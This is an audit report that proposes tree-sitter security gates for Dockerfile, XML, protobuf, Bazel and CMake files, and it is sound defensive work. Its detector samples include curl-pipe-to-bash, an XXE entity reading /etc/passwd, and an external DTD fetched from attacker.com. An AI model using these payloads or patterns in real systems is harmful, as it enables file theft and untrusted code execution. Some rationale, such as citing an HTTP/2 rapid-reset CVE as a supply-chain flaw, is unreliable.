# Omniscient Coverage Audit — Executable Gap Ledger

**Audit date:** 2026-04-02  
**Recon tool:** `tools/omni_coverage_mapper.sh`  
**Corpus:** 15 enterprise repositories (see `gauntlet_targets.txt`)  
**Total file-extension records scanned:** ~250 000 tracked paths

---

## Methodology

`omni_coverage_mapper.sh` performs `git clone --depth 1 --filter=blob:none --sparse`
across all 15 repositories (no blob content downloaded — manifest only), then
extracts every file extension via `git ls-files | awk -F'.' 'NF>1 …'` and
produces a frequency-sorted table at `/tmp/omni_mapper_out/ext_freq_sorted.txt`.

**Script limitation**: files with no extension (`Dockerfile`, `Makefile`, `BUILD`,
`Gemfile`, `Jenkinsfile`) are invisible to the awk splitter. A secondary check via
`git ls-files | awk -F'.' 'NF==1'` confirms their presence; they are included in
the gap analysis below.

---

## Current Grammar Coverage (23 languages)

| Extension(s) | Language | Depth |
|---|---|---|
| rs | Rust | AST |
| py | Python | AST |
| ts, tsx | TypeScript / TSX | AST |
| js, jsx, mjs, cjs | JavaScript / JSX | AST |
| go | Go | AST |
| java | Java | AST |
| cs | C# | AST |
| cpp, cxx, cc, hpp, hxx | C++ | AST |
| c, h | C | AST |
| rb | Ruby | AST |
| php | PHP | AST |
| swift | Swift | AST |
| kt, kts | Kotlin | AST |
| scala | Scala | AST |
| lua | Lua | AST |
| tf, hcl | HCL / Terraform | AST |
| nix | Nix | AST |
| gd | GDScript | AST |
| glsl, vert, frag | GLSL | AST |
| m, mm | Objective-C / C++ | AST |
| sh, bash, cmd, zsh | Bash | AST |
| yaml, yml | YAML | byte |

---

## Corpus Frequency Table (Top 50 — executable candidates highlighted)

| Count | Extension | Covered? | Class |
|---|---|---|---|
| 48 877 | ts | ✅ | source |
| 42 706 | nix | ✅ | source |
| 37 692 | rs | ✅ | source |
| 26 090 | json | — | data |
| 18 686 | go | ✅ | source |
| 14 547 | js | ✅ | source |
| 10 672 | cc | ✅ (cpp) | source |
| 10 547 | h | ✅ | source |
| 8 316 | rb | ✅ | source |
| 7 822 | pbtxt | — | model config (non-executable at PR scope) |
| 7 266 | md | — | docs |
| 6 922 | tsx | ✅ | source |
| 6 242 | yaml | ✅ | source |
| 3 609 | py | ✅ | source |
| 2 432 | cpp | ✅ | source |
| 1 895 | sh | ✅ | source |
| **1 439** | **xml** | ❌ | **infra / Spring / Maven / Android** |
| **1 443** | **mlir** | — | ML compiler IR (low PR-scope impact) |
| 1 183 | css | — | style |
| 1 144 | c | ✅ | source |
| 768 | toml | — | config (manifest-scanned separately) |
| 614 | html | — | markup |
| **481** | **proto** | ❌ | **gRPC service definitions** |
| **473** | **bzl + bazel** | ❌ | **Bazel build rules** |
| **48** | **cmake** | ❌ | **CMake build scripts** |
| **36** | **plist** | ❌ | **Apple property lists** |
| **25** | **gradle** | ❌ | **Gradle build scripts** |
| **14+∞** | **Dockerfile** | ❌ | **Container build definitions** |
| **8** | **graphql, gql** | ❌ | **API schema definitions** |

---

## Executable Gaps

Extensions that execute logic, build software, or define infrastructure and
are absent from the current grammar registry:

| Rank | Extension | Count | Class | Risk |
|---|---|---|---|---|
| 1 | Dockerfile (no ext) | ∞ | container | Critical — supply chain |
| 2 | xml | 1 439 | infra / config | Critical — XXE |
| 3 | proto | 481 | RPC contract | High — deser gadget |
| 4 | bzl, bazel | 473 | build system | High — unverified fetch |
| 5 | cmake | 48 | build system | High — build injection |

Non-executable gaps (excluded from remediation scope): `json`, `pbtxt`, `md`,
`mlir`, `css`, `html`, `svg`, `png`, `avif`, `lock`, `snap`, `rast`, `mir`.

---

## Top 5 Gap Definitions — Proposed AST Gates

### 1. Dockerfile — `tree-sitter-dockerfile`

**Grammar:** `tree-sitter-dockerfile` (crates.io: `tree-sitter-dockerfile`)  
**Extension mapping:** `Dockerfile` (no extension), `.dockerfile`

**Proposed gate — `security:dockerfile_pipe_execution` (Critical, 50 pts)**

Trigger: any `RUN` instruction whose shell fragment contains a pipe terminating in
a shell interpreter (`bash`, `sh`, `ash`, `dash`).

```dockerfile
# FIRES — supply chain execution
RUN curl -fsSL https://example.com/install.sh | bash
RUN wget -qO- https://example.com/setup.sh | sh

# CLEAN — explicit file, no pipe-to-shell
RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \
    && sha256sum /tmp/install.sh \
    && bash /tmp/install.sh
```

AST path: `run_instruction → shell_command` → byte-scan for `| bash` / `| sh`
pattern with non-literal left operand.

Rationale: CVE-2023-44487 (rapid-reset), XZ Utils backdoor
(`eval $(echo ` pattern) — identical supply-chain class.

---

### 2. XML — `tree-sitter-xml`

**Grammar:** `tree-sitter-xml` (crates.io: `tree-sitter-xml`)  
**Extension mapping:** `xml`, `xsd`, `wsdl`, `pom`

**Proposed gate — `security:xxe_external_entity` (Critical, 50 pts)**

Trigger: `DOCTYPE` declaration that references an external entity via `SYSTEM`
or `PUBLIC` keyword.

```xml
<!-- FIRES — classic XXE, CWE-611 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- FIRES — SSRF via external DTD -->
<!DOCTYPE foo PUBLIC "-//OWASP//DTD" "http://attacker.com/evil.dtd">

<!-- CLEAN — no DOCTYPE or inline non-entity DOCTYPE -->
<root><child>safe</child></root>
```

AST path: `document → dtd → entity_declaration` where `external_id` node is
present (`system_literal` or `public_id`).

Rationale: XXE is OWASP A05 (Security Misconfiguration), actively exploited in
Spring/Java, Android `AndroidManifest.xml`, and Maven `pom.xml` parsers.

---

### 3. Protocol Buffers — `tree-sitter-proto`

**Grammar:** `tree-sitter-proto` (crates.io: `tree-sitter-proto`)  
**Extension mapping:** `proto`

**Proposed gate — `security:protobuf_any_type_field` (High, 50 pts)**

Trigger: field declaration whose type is `google.protobuf.Any` in a service-level
message definition (i.e., inside a `message` that is referenced by an `rpc` statement).

```protobuf
// FIRES — Any is an arbitrary-message gadget
message ExecuteRequest {
  google.protobuf.Any payload = 1;  // can carry any message type
}

// CLEAN — concrete type
message ExecuteRequest {
  string command = 1;
}
```

AST path: `message_definition → field → type_name` equals `google.protobuf.Any`.

Rationale: `Any` fields bypass type safety at the gRPC boundary; deserialization
of `Any` with attacker-controlled `type_url` is a known gadget chain class in
Java/Python gRPC servers.

---

### 4. Bazel / Starlark — `tree-sitter-starlark`

**Grammar:** `tree-sitter-starlark` (crates.io: `tree-sitter-starlark`)  
**Extension mapping:** `bzl`, `bazel`, extension-less `BUILD` / `WORKSPACE`

**Proposed gate — `security:bazel_unverified_http_archive` (Critical, 50 pts)**

Trigger: `http_archive()` or `http_file()` call expression that lacks a `sha256`
keyword argument.

```python
# FIRES — no sha256, arbitrary code execution on next build
http_archive(
    name = "foreign_dep",
    urls = ["https://example.com/release.tar.gz"],
)

# CLEAN — pinned by cryptographic hash
http_archive(
    name = "foreign_dep",
    urls = ["https://example.com/release.tar.gz"],
    sha256 = "abc123…",
)
```

AST path: `call → identifier{http_archive|http_file}` where `arguments` contains
no `keyword_argument` with key `sha256`.

Rationale: mirrors the Nix-1 gate (`security:unverified_fetch`). Bazel's
`http_archive` without `sha256` is a reproducibility and supply-chain integrity
failure — an attacker who compromises the upstream server can silently substitute
a malicious tarball.

---

### 5. CMake — `tree-sitter-cmake`

**Grammar:** `tree-sitter-cmake` (crates.io: `tree-sitter-cmake`)  
**Extension mapping:** `cmake`, extension-less `CMakeLists.txt`

**Proposed gate — `security:cmake_execute_process_injection` (High, 50 pts)**

Trigger: `execute_process(COMMAND …)` where the first argument to `COMMAND` is
a variable reference (`${VAR}`) rather than a string literal.

```cmake
# FIRES — variable-interpolated command, injectable at configure time
execute_process(COMMAND ${USER_TOOL} --build ${CMAKE_BINARY_DIR})

# CLEAN — literal executable path
execute_process(COMMAND cmake --build ${CMAKE_BINARY_DIR})
```

AST path: `normal_command{execute_process}` → argument list → first argument
after `COMMAND` keyword is a `variable_ref` node.

Rationale: `execute_process` runs at CMake configure time (before the build).
A variable sourced from a toolchain file, environment variable, or user-supplied
`-D` flag becomes arbitrary command execution during `cmake ..`.

---

## Script Limitation: Extension-Less Files

The `awk -F'.' 'NF>1'` splitter silently drops all files without a dot in their
name. These include high-value targets:

| File pattern | Repos present | Security class |
|---|---|---|
| `Dockerfile` | kubernetes, tensorflow, trivy | Container supply chain |
| `Makefile` | kubernetes, rust-lang | Build injection |
| `BUILD` | tensorflow, bazel repos | Starlark (covered by .bzl gate) |
| `Gemfile` | homebrew-core | Ruby dependency pinning |
| `Jenkinsfile` | enterprise CI | Groovy RCE |

**Recommendation:** extend `omni_coverage_mapper.sh` with a second pass using
`git ls-files | awk -F'.' 'NF==1'` filtered against a known extension-less
executable file name list.

---

## Implementation Priority

| Priority | Gate | Grammar | Estimated effort |
|---|---|---|---|
| P0 | `security:dockerfile_pipe_execution` | tree-sitter-dockerfile | Medium — byte scan first, AST fallback |
| P1 | `security:xxe_external_entity` | tree-sitter-xml | Medium — DOCTYPE scan is byte-feasible |
| P1 | `security:bazel_unverified_http_archive` | tree-sitter-starlark | Low — mirrors Nix-1 pattern exactly |
| P2 | `security:protobuf_any_type_field` | tree-sitter-proto | Low — field type string match |
| P2 | `security:cmake_execute_process_injection` | tree-sitter-cmake | Medium — AST variable_ref check |
